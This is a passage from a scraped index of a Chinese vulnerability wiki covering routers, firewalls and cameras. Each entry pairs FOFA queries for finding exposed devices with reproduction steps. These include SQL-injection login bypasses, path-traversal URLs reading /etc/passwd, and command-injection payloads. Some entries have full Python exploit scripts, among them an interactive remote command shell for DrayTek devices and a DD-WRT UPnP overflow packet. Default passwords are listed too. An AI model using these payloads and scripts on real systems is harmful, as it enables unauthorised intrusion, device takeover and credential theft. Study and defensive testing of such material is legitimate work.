FOFA [!NOTE] app=\"D_Link-DNS-ShareCenter\" 漏洞复现 登录页面如下 漏洞POC为 /cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;ls; 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/D-Link/D-Link DSR-250N 万能密码漏洞.html":{"url":"book/网络设备漏洞/D-Link/D-Link DSR-250N 万能密码漏洞.html","title":"D-Link DSR-250N 万能密码漏洞","keywords":"","body":"D-Link DSR-250N 万能密码漏洞 漏洞描述 D-Link DSR-250N 存在万能密码漏洞，攻击者通过漏洞可以获取后台权限 漏洞影响 [!NOTE] D-Link DSR-250N FOFA [!NOTE] app=\"D_Link-DSR-250N\" 漏洞复现 登录页面如下 user: admin pass: ' or '1'='1 成功登录后台 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/HIKVISION/":{"url":"book/网络设备漏洞/HIKVISION/","title":"HIKVISION","keywords":"","body":"HIKVISION HIKVISION 视频编码设备接入网关 任意文件下载 HIKVISION 流媒体管理服务器 后台任意文件读取漏洞 CNVD-2021-14544 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/HIKVISION/HIKVISION 视频编码设备接入网关 任意文件下载.html":{"url":"book/网络设备漏洞/HIKVISION/HIKVISION 视频编码设备接入网关 任意文件下载.html","title":"HIKVISION 视频编码设备接入网关 任意文件下载","keywords":"","body":"HIKVISION 视频编码设备接入网关 任意文件下载 漏洞描述 海康威视视频接入网关系统在页面/serverLog/downFile.php的参数fileName存在任意文件下载漏洞 漏洞影响 [!NOTE] HIKVISION 视频编码设备接入网关 FOFA [!NOTE] title=\"视频编码设备接入网关\" 漏洞复现 漏洞文件为 downFile.php, 其中 参数 fileName 没有过滤危险字符，导致可文件遍历下载 alert(\"文件不存在!\");window.history.back(-1);'; exit(); }else{ $file = fopen($file_dir . $file_name,\"r\"); // 打开文件 // 输入文件标签 Header(\"Content-type: application/octet-stream\"); Header(\"Accept-Ranges: bytes\"); Header(\"Accept-Length: \".filesize($file_dir . $file_name)); Header(\"Content-Disposition: attachment; filename=\" . $file_name); // 输出文件内容 echo fread($file,filesize($file_dir.$file_name)); fclose($file); exit(); } ?> 访问 http://xxx.xxx.xxx.xxx/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php 下载文件 漏洞利用POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: HIKVISION 视频编码设备接入网关 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php \\033[0m\".format(target_url)) if \"$file_name\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功读取 downFile.php \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 不存在漏洞 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 HIKVISION_Video_coding_equipment_Download_any_file 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/HIKVISION/HIKVISION 流媒体管理服务器 后台任意文件读取漏洞 CNVD-2021-14544.html":{"url":"book/网络设备漏洞/HIKVISION/HIKVISION 流媒体管理服务器 后台任意文件读取漏洞 CNVD-2021-14544.html","title":"HIKVISION 流媒体管理服务器 后台任意文件读取漏洞 CNVD-2021-14544","keywords":"","body":"HIKVISION 流媒体管理服务器 后台任意文件读取漏洞 CNVD-2021-14544 漏洞描述 杭州海康威视系统技术有限公司流媒体管理服务器存在弱口令漏洞，攻击者可利用该漏洞登录后台通过文件遍历漏洞获取敏感信息 漏洞影响 [!NOTE] HIKVISION 流媒体管理服务器 FOFA [!NOTE] title=\"流媒体管理服务器\" 漏洞复现 登录页面如下， 默认账号密码为 admin/12345 POC如下，访问如下Url下载 system.ini文件 http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini 成功读取 C:/windows/system.ini 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/Sapido/":{"url":"book/网络设备漏洞/Sapido/","title":"Sapido","keywords":"","body":"Sapido Sapido多款路由器命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/Sapido/Sapido多款路由器命令执行漏洞.html":{"url":"book/网络设备漏洞/Sapido/Sapido多款路由器命令执行漏洞.html","title":"Sapido多款路由器命令执行漏洞","keywords":"","body":"Sapido多款路由器命令执行漏洞 漏洞描述 Sapido多款路由器在未授权的情况下，导致任意访问者可以以Root权限执行命令 漏洞影响 [!NOTE] BR270n-v2.1.03 BRC76n-v2.1.03 GR297-v2.1.3 RB1732-v2.0.43 FOFA [!NOTE] app=\"Sapido-路由器\" 漏洞复现 固件中存在一个asp文件为 syscmd.asp 存在命令执行 访问目标: http://xxx.xxx.xxx.xxx/syscmd.asp http://xxx.xxx.xxx.xxx/syscmd.htm 直接输入就可以命令执行了 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/H3C/H3C HG659 lib 任意文件读取.html":{"url":"book/网络设备漏洞/H3C/H3C HG659 lib 任意文件读取.html","title":"H3C HG659 lib 任意文件读取","keywords":"","body":"H3C HG659 lib 任意文件读取 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:50:07 "},"book/网络设备漏洞/H3C/H3C SecPath 下一代防火墙 任意文件下载漏洞.html":{"url":"book/网络设备漏洞/H3C/H3C SecPath 下一代防火墙 任意文件下载漏洞.html","title":"H3C SecPath 下一代防火墙 任意文件下载漏洞","keywords":"","body":"H3C SecPath 下一代防火墙 任意文件下载漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:50:07 "},"book/网络设备漏洞/iKuai/":{"url":"book/网络设备漏洞/iKuai/","title":"iKuai","keywords":"","body":"iKuai iKuai 流控路由 SQL注入漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/iKuai/iKuai 流控路由 SQL注入漏洞.html":{"url":"book/网络设备漏洞/iKuai/iKuai 流控路由 SQL注入漏洞.html","title":"iKuai 流控路由 SQL注入漏洞","keywords":"","body":"iKuai 流控路由 SQL注入漏洞 漏洞描述 iKuai 流控路由 存在SQL注入漏洞，可以通过SQL注入漏洞构造万能密码获取路由器后台管理权限 漏洞影响 [!NOTE] iKuai 流控路由 FOFA [!NOTE] title=\"登录爱快流控路由\" 漏洞复现 登录页面如下 使用万能密码登录后台 user: \"or\"\"=\"\"or\"\"=\" pass: 空 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/ZeroShell/":{"url":"book/网络设备漏洞/ZeroShell/","title":"ZeroShell","keywords":"","body":"ZeroShell ZeroShell 3.9.0 远程命令执行漏洞 CVE-2019-12725 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/ZeroShell/ZeroShell 3.9.0 远程命令执行漏洞 CVE-2019-12725.html":{"url":"book/网络设备漏洞/ZeroShell/ZeroShell 3.9.0 远程命令执行漏洞 CVE-2019-12725.html","title":"ZeroShell 3.9.0 远程命令执行漏洞 CVE-2019-12725","keywords":"","body":"ZeroShell 3.9.0 远程命令执行漏洞 CVE-2019-12725 漏洞描述 ZeroShell 3.9.0 存在命令执行漏洞，/cgi-bin/kerbynet 页面，x509type 参数过滤不严格，导致攻击者可执行任意命令 漏洞影响 [!NOTE] ZeroShell FOFA [!NOTE] app=\"Zeroshell-防火墙\" 漏洞复现 登录页面如下 验证的POC为 /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aid%0A%27 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/JCG/":{"url":"book/网络设备漏洞/JCG/","title":"JCG","keywords":"","body":"JCG JCG JHR-N835R 后台命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/JCG/JCG JHR-N835R 后台命令执行漏洞.html":{"url":"book/网络设备漏洞/JCG/JCG JHR-N835R 后台命令执行漏洞.html","title":"JCG JHR-N835R 后台命令执行漏洞","keywords":"","body":"JCG JHR-N835R 后台命令执行漏洞 漏洞描述 JCG JHR-N835R 后台存在命令执行，通过 ; 分割 ping 命令导致任意命令执行 漏洞影响 [!NOTE] JCG JHR-N835R Shodan [!NOTE] JHR-N835R 漏洞复现 登录页面 admin admin登录 在后台系统工具那使用 PING工具，使用 ; 命令执行绕过 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/DD-WRT/":{"url":"book/网络设备漏洞/DD-WRT/","title":"DD-WRT","keywords":"","body":"DD-WRT DD-WRT UPNP缓冲区溢出漏洞 CVE-2021-27137 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/DD-WRT/DD-WRT UPNP缓冲区溢出漏洞 CVE-2021-27137.html":{"url":"book/网络设备漏洞/DD-WRT/DD-WRT UPNP缓冲区溢出漏洞 CVE-2021-27137.html","title":"DD-WRT UPNP缓冲区溢出漏洞 CVE-2021-27137","keywords":"","body":"DD-WRT UPNP缓冲区溢出漏洞 CVE-2021-27137 漏洞描述 默认情况下，DD-WRT中的UPNP处于禁用状态，并且仅在内部网络接口上侦听。 UPNP本质上是未经身份验证的UDP形式的协议–由于无法对协议强制执行身份验证，因此它既易于使用又具有不安全性。 如果DD-WRT启用了UPNP服务，则坐在存在DD-WRT设备的LAN上的远程攻击者可以通过发送一个过长的uuid值来触发缓冲区溢出。 根据部署DD-WRT的平台的不同，可能存在缓解措施，也可能没有缓解措施，例如ASLR等，这使得可利用性取决于安装DD-WRT的平台。 漏洞影响 [!NOTE] DD-WRT 漏洞复现 通过查看源代码，ssdp.c可以很容易地发现有问题的代码： 用户提供的数据的未绑定副本被复制到缓冲区中，该缓冲区的大小限制为128个字节。 由于默认情况下未启用UPNP服务，因此重新创建漏洞的第一步是启用将自动启动该服务的服务 启动PoC脚本将触发upnp服务崩溃，这可以在启动以下python脚本几秒钟后看到 漏洞利用POC import socket target_ip = \"192.168.15.124\" # IP Address of Target off = \"D\"*164 ret_addr = \"AAAA\" payload = off + ret_addr packet = \\ 'M-SEARCH * HTTP/1.1\\r\\n' \\ 'HOST:239.255.255.250:1900\\r\\n' \\ 'ST:uuid:'+payload+'\\r\\n' \\ 'MX:2\\r\\n' \\ 'MAN:\"ssdp:discover\"\\r\\n' \\ '\\r\\n' s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) s.sendto(packet.encode(), (target_ip, 1900) ) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/MagicFlow/":{"url":"book/网络设备漏洞/MagicFlow/","title":"MagicFlow","keywords":"","body":"稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/MagicFlow/MagicFlow 防火墙网关 main.xp 任意文件读取漏洞.html":{"url":"book/网络设备漏洞/MagicFlow/MagicFlow 防火墙网关 main.xp 任意文件读取漏洞.html","title":"MagicFlow 防火墙网关 main.xp 任意文件读取漏洞","keywords":"","body":"MagicFlow 防火墙网关 main.xp 任意文件读取漏洞 漏洞描述 MagicFlow 防火墙网关 main.xp 存在任意文件读取漏洞，攻击者通过构造特定的Url获取敏感文件 漏洞影响 [!NOTE] MagicFlow 防火墙网关 FOFA [!NOTE] app=\"MSA/1.0\" 漏洞复现 登录页面如下 构造POC /msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/WayOS/":{"url":"book/网络设备漏洞/WayOS/","title":"WayOS","keywords":"","body":"Wayos Wayos AC集中管理系统默认弱口令 CNVD-2021-00876 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/WayOS/Wayos AC集中管理系统默认弱口令 CNVD-2021-00876.html":{"url":"book/网络设备漏洞/WayOS/Wayos AC集中管理系统默认弱口令 CNVD-2021-00876.html","title":"Wayos AC集中管理系统默认弱口令 CNVD-2021-00876","keywords":"","body":"Wayos AC集中管理系统默认弱口令 CNVD-2021-00876 漏洞描述 深圳维盟科技股份有限公司是国内领先的网络设备及智能家居产品解决方案供应商，主营产品包括无线网关、交换机、国外VPN、双频吸顶ap等。 AC集中管理平台存在弱口令漏洞，攻击者可利用该漏洞获取敏感信息。 漏洞影响 [!NOTE] AC集中管理系统 FOFA [!NOTE] title=\"AC集中管理系统\" 漏洞复现 默认弱口令为 admin:admin Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Wayos_AC_Centralized_management_system_Default_weak_password 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/WayOS/Wayos 防火墙 账号密码泄露漏洞.html":{"url":"book/网络设备漏洞/WayOS/Wayos 防火墙 账号密码泄露漏洞.html","title":"Wayos 防火墙 账号密码泄露漏洞","keywords":"","body":"Wayos 防火墙 账号密码泄露漏洞 漏洞描述 Wayos 防火墙存在账号密码泄露漏洞，攻击者通过前端可以查看到密码的md5的加密字符，解密后可以登陆后台 漏洞影响 [!NOTE] Wayos 防火墙 FOFA [!NOTE] body=\"Get_Verify_Info(hex_md5(user_string).\" 漏洞复现 登录页面如下 F12 查看账号密码 解密Md5即可登录后台 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/WayOS/Wayos 防火墙 后台命令执行漏洞.html":{"url":"book/网络设备漏洞/WayOS/Wayos 防火墙 后台命令执行漏洞.html","title":"Wayos 防火墙 后台命令执行漏洞","keywords":"","body":"Wayos 防火墙 后台命令执行漏洞 漏洞描述 Wayos 防火墙 后台存在命令执行漏洞，通过命令注入可以执行远程命令 漏洞影响 [!NOTE] Wayos 防火墙 FOFA [!NOTE] body=\"Get_Verify_Info(hex_md5(user_string).\" 漏洞复现 登录页面如下 登录后台后 ping 模块命令执行 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/DrayTek/":{"url":"book/网络设备漏洞/DrayTek/","title":"DrayTek","keywords":"","body":"DrayTek DrayTek企业网络设备 远程命令执行 CVE-2020-8515 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/DrayTek/DrayTek企业网络设备 远程命令执行 CVE-2020-8515.html":{"url":"book/网络设备漏洞/DrayTek/DrayTek企业网络设备 远程命令执行 CVE-2020-8515.html","title":"DrayTek企业网络设备 远程命令执行 CVE-2020-8515","keywords":"","body":"DrayTek企业网络设备 远程命令执行 CVE-2020-8515 漏洞描述 DrayTek URI未能正确处理SHELL字符，远程攻击者可以利用该漏洞提交特殊的请求，可以ROOT权限执行任意命令。 远程命令注入漏洞被标记为CVE-2020-8515，主要影响了DrayTek Vigor网络设备，包括企业交换机、路由器、负载均衡器和VPN网关。 漏洞影响 [!NOTE] Vigor2960 Vigor300B Vigor3900 VigorSwitch20P2121 VigorSwitch20G1280 VigorSwitch20P1280 VigorSwitch20G2280 VigorSwitch20P2280 FOFA [!NOTE] title=\"Vigor 2960\" 漏洞复现 登录页面抓包 请求包如下 POST /cgi-bin/mainfunction.cgi HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Content-Length: 67 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Content-Type: text/plain; charset=UTF-8 Accept: */* Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 action=login&keyPath=%27%0A%2fbin%2fls%0A%27&loginUser=a&loginPwd=a 其中出现注入点的参数为 keyPath [!NOTE] 出现空格需要替换，例如 cat /etc/passwd --> cat${IFS}/etc/passwd 可以使用 & 执行额外一条命令 (URL编码为 %26) 漏洞利用POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: DrayTek企业网络设备 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> pwd \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/cgi-bin/mainfunction.cgi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"action=login&keyPath=%27%0A%2fbin%2fcat${IFS}/etc/passwd%0A%27&loginUser=a&loginPwd=a\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}/cgi-bin/mainfunction.cgi \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功读取 /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) while True: Cmd = input(\"\\033[35mCmd >>> \\033[0m\") if Cmd == \"exit\": sys.exit(0) else: POC_2(target_url, Cmd) else: print(\"\\033[31m[x] 不存在漏洞 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) sys.exit(0) def POC_2(target_url, Cmd): vuln_url = target_url + \"/cgi-bin/mainfunction.cgi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } Cmd = Cmd.replace(' ','${IFS}') data = \"action=login&keyPath=%27%0A%2fbin%2f%26{}%0A%27&loginUser=a&loginPwd=a\".format(Cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if response.status_code == 200: print(\"\\033[32m[o] 正在请求 {}/cgi-bin/mainfunction.cgi \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Goby中已经包含此漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/Intelbras/":{"url":"book/网络设备漏洞/Intelbras/","title":"Intelbras","keywords":"","body":"Intelbras Intelbras Wireless 未授权与密码泄露 CVE-2021-3017 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/Intelbras/Intelbras Wireless 未授权与密码泄露 CVE-2021-3017.html":{"url":"book/网络设备漏洞/Intelbras/Intelbras Wireless 未授权与密码泄露 CVE-2021-3017.html","title":"Intelbras Wireless 未授权与密码泄露 CVE-2021-3017","keywords":"","body":"Intelbras Wireless 未授权与密码泄露 CVE-2021-3017 漏洞描述 Intelbras IWR 3000N是波兰Intelbras公司的一款无线路由器。 Intelbras WIN 300 and WRN 342 devices 2021-01-04版本及之前版本存在安全漏洞，该漏洞允许远程攻击者通过读取HTML源代码中的def wireless spassword行来发现凭据。 漏洞影响 [!NOTE] win_300_firmware 等 FOFA [!NOTE] body=\"def_wirelesspassword\" 漏洞复现 登录页面如下 查看网页源代码，泄露了配置密码 测试了一下其他的，发现出现账号密码的原因为访问的是路由的配置页面，配置后获取后台权限 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/TVT数码科技/":{"url":"book/网络设备漏洞/TVT数码科技/","title":"TVT数码科技","keywords":"","body":"TVT数码科技 TVT数码科技 NVMS-1000 路径遍历漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/TVT数码科技/TVT数码科技 NVMS-1000 路径遍历漏洞.html":{"url":"book/网络设备漏洞/TVT数码科技/TVT数码科技 NVMS-1000 路径遍历漏洞.html","title":"TVT数码科技 NVMS-1000 路径遍历漏洞","keywords":"","body":"TVT数码科技 NVMS-1000 路径遍历漏洞 漏洞描述 TVT数码科技 TVT NVMS-1000是中国TVT数码科技公司的一套网络监控视频管理系统。 TVT数码科技 TVT NVMS-1000中存在路径遍历漏洞。远程攻击者可通过发送包含/../的特制URL请求利用该漏洞查看系统上的任意文件。 漏洞影响 [!NOTE] TVT NVMS-1000 FOFA [!NOTE] app=\"TVT-NVMS-1000\" 漏洞复现 登录页面如下 发送请求包读取文件 GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1 Host: Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/蜂网互联/":{"url":"book/网络设备漏洞/蜂网互联/","title":"蜂网互联","keywords":"","body":"蜂网互联 蜂网互联 企业级路由器v4.31 密码泄露漏洞 CVE-2019-16313 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/蜂网互联/蜂网互联 企业级路由器v4.31 密码泄露漏洞 CVE-2019-16313.html":{"url":"book/网络设备漏洞/蜂网互联/蜂网互联 企业级路由器v4.31 密码泄露漏洞 CVE-2019-16313.html","title":"蜂网互联 企业级路由器v4.31 密码泄露漏洞 CVE-2019-16313","keywords":"","body":"蜂网互联 企业级路由器v4.31 密码泄露漏洞 CVE-2019-16313 漏洞描述 蜂网互联企业级路由器v4.31存在接口未授权访问，导致攻击者可以是通过此漏洞得到路由器账号密码接管路由器 漏洞影响 [!NOTE] 蜂网互联企业级路由器v4.31 FOFA [!NOTE] app=\"蜂网互联-互联企业级路由器\" 漏洞复现 登录页面登录后可以看到，账号密码存在接口访问 而 /action/usermanager.htm 存在未授权访问，可通过直接访问获得账号密码 [!NOTE] 不存在漏洞时 state值为 3 漏洞利用POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: DrayTek企业网络设备 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/action/usermanager.htm\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}/action/usermanager.htm \\033[0m\".format(target_url)) if \"pwd\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 不存在漏洞 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 IFW8Enterprise_router_Password_leakage 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/中科网威/":{"url":"book/网络设备漏洞/中科网威/","title":"中科网威","keywords":"","body":"中科网威 中科网威 下一代防火墙控制系统 账号密码泄露漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/中科网威/中科网威 下一代防火墙控制系统 账号密码泄露漏洞.html":{"url":"book/网络设备漏洞/中科网威/中科网威 下一代防火墙控制系统 账号密码泄露漏洞.html","title":"中科网威 下一代防火墙控制系统 账号密码泄露漏洞","keywords":"","body":"中科网威 下一代防火墙控制系统 账号密码泄露漏洞 漏洞描述 中科网威 下一代防火墙控制系统 存在账号密码泄露漏洞，攻击者通过前端获取密码的Md5后解密可获取完整密码登陆后台 漏洞影响 [!NOTE] 中科网威 下一代防火墙控制系统 FOFA [!NOTE] body=\"Get_Verify_Info(hex_md5(user_string).\" 漏洞复现 登录页面如下 F12查看前端发现 admin的md5加密密码 解密后登录后台 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/菲力尔/":{"url":"book/网络设备漏洞/菲力尔/","title":"菲力尔","keywords":"","body":"菲力尔 FLIR-AX8 download.php 任意文件下载 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/菲力尔/FLIR-AX8 download.php 任意文件下载.html":{"url":"book/网络设备漏洞/菲力尔/FLIR-AX8 download.php 任意文件下载.html","title":"FLIR-AX8 download.php 任意文件下载","keywords":"","body":"FLIR-AX8 download.php 任意文件下载 漏洞描述 FLIR-AX8 download.php文件过滤不全 存在任意文件下载漏洞 漏洞影响 [!NOTE] FLIR-AX8 FOFA [!NOTE] app=\"FLIR-FLIR-AX8\" 漏洞复现 出现漏洞的文件为 download.php \"application/octet-stream\", \"zip\" => \"application/zip\", \"mp3\" => \"audio/mpeg\", \"mpg\" => \"video/mpeg\", \"avi\" => \"video/x-msvideo\", ); $ctype = isset($content_types[$file_ext]) ? $content_types[$file_ext] : $ctype_default; header(\"Content-Type: \" . $ctype); //check if http_range is sent by browser (or download manager) if(isset($_SERVER['HTTP_RANGE'])) { list($size_unit, $range_orig) = explode('=', $_SERVER['HTTP_RANGE'], 2); if ($size_unit == 'bytes') { //multiple ranges could be specified at the same time, but for simplicity only serve the first range //http://tools.ietf.org/id/draft-ietf-http-range-retrieval-00.txt list($range, $extra_ranges) = explode(',', $range_orig, 2); } else { $range = ''; header('HTTP/1.1 416 Requested Range Not Satisfiable'); exit; } } else { $range = ''; } //figure out download piece from range (if set) list($seek_start, $seek_end) = explode('-', $range, 2); ob_clean(); //set start and end based on range (if set), else set defaults //also check for invalid ranges. $seek_end = (empty($seek_end)) ? ($file_size - 1) : min(abs(intval($seek_end)),($file_size - 1)); $seek_start = (empty($seek_start) || $seek_end 0 || $seek_end 简单审计可以发现 file参数 为可控参数且没有过滤参数，导致可以下载任意文件 /download.php?file=/etc/passwd 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/网络设备漏洞/朗视/":{"url":"book/网络设备漏洞/朗视/","title":"朗视","keywords":"","body":"朗视 朗视 TG400 GSM 网关目录遍历 